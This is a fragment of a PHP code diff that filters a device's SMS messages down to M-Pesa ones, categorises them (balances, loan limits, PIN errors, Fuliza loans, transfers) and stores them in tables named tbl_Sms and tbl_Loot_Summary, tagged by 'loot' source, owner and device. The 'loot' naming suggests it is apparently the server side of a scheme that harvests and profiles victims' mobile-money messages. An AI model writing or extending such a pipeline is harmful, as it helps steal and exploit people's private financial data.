+        string $uuid,
+        string $owner,
+        string $device
+    ): array {
+        $cleaned = $this->clean_sms_by_trimming_messages($smsData);
+        $categorized = $this->clean_sms_by_categorizing($cleaned);
+
+        $batch = [];
+        $columns = ['Date', 'Type', 'Number', 'Seen', 'ID', 'Thread Id'];
+
+        foreach ($smsData as $index => $sms) {
+            if ($sms->Number != "MPESA") continue;
+
+            $batch[] = [
+                'sms_type' => $sms->Type,
+                'sms_number' => $sms->Number,
+                'sms_thread_id' => $sms->{'Thread Id'},
+                'sms_time' => $sms->Date,
+                'sms_category' => $categorized['categories'][$index] ?? 'sms_unknown',
+                'sms_seen' => $sms->Seen,
+                'sms__id' => $sms->ID,
+                'sms_body' => $cleaned[$index] ?? '',
+                'sms_loot_source' => $uuid,
+                'sms_owner' => $owner,
+                'sms_device' => $device
+            ];
+        }
+
+        $inserted = 0;
+        foreach (array_chunk($batch, 100) as $chunk) {
+            $inserted += $this->db->table('tbl_Sms')->insertBatch($chunk)
+                ? count($chunk) : 0;
+        }
+
+        return [
+            'inserted_count' => $inserted,
+            'counters' => $categorized['counters']
+        ];
+    }
+
+    protected function save_summary_data(array $counters, string $uuid, string $date): bool {
+        $mapping = [
+            'sms_receive' => 'info_Get_from_MPESA',
+            'sms_from_mshwari' => 'info_Get_from_Mshwari',
+            'sms_from_ncba' => 'info_Get_from_NCBA',
+            'sms_from_kcb' => 'info_Get_from_KCB',
+            'sms_from_im_bank' => 'info_Get_from_IM',
+            'sms_reversal' => 'info_Get_from_Reversal',
+            'sms_balance_mpesa' => 'info_Get_Bal_MPESA',
+            'sms_balance_kcb' => 'info_Get_Bal_KCB',
+            'sms_balance_mshwari' => 'info_Get_Bal_Mshwari',
+            'sms_loan_limit' => 'info_Loan_Limit',
+            'sms_sent_to_mpesa' => 'info_Sent_to_MPESA',
+            'sms_sent_to_lnm' => 'info_Sent_to_LNM',
+            'sms_sent_mini' => 'info_Sent_Mini',
+            'sms_sent_to_mshwari' => 'info_Sent_to_Mshwari',
+            'sms_sent_cancel' => 'info_Sent_Cancel',
+            'sms_error_failed' => 'info_Error_Failed',
+            'sms_error_pin' => 'info_Error_Pin',
+            'sms_error_insufficient' => 'info_Error_Less',
+            'sms_error_receiver' => 'info_Error_Receiver',
+            'sms_error_receiver_org' => 'info_Error_Receiver_Org',
+            'sms_withdraw' => 'info_Withdraw',
+            'sms_fuliza_opt_out' => 'info_Fuliza_Opt_Out',
+            'sms_fuliza_opt_in' => 'info_Fuliza_Opt_In',
+            'sms_fuliza_limit' => 'info_Fuliza_Limit',
+            'sms_fuliza_loan_pay' => 'info_Fuliza_Loan_Paid',
+            'sms_fuliza_mini_statement' => 'info_Fuliza_Mini_Statement',
+            'sms_fuliza_loan_taken' => 'info_Fuliza_Loan_Taken',
+            'sms_similar_transaction' => 'info_Similar_Transaction',
+            'sms_unknown' => 'info_Unknown'
+        ];
+
+        $summary = ['loot_Uuid' => $uuid, 'loot_Created' => $date];
+
+        foreach ($mapping as $pattern => $field) {
+            $summary[$field] = $counters[$pattern] ?? 0;
+        }
+
+        $summary['info_All'] = array_sum($counters);
+
+        return $this->db->table('tbl_Loot_Summary')->insert($summary);
     }
 }
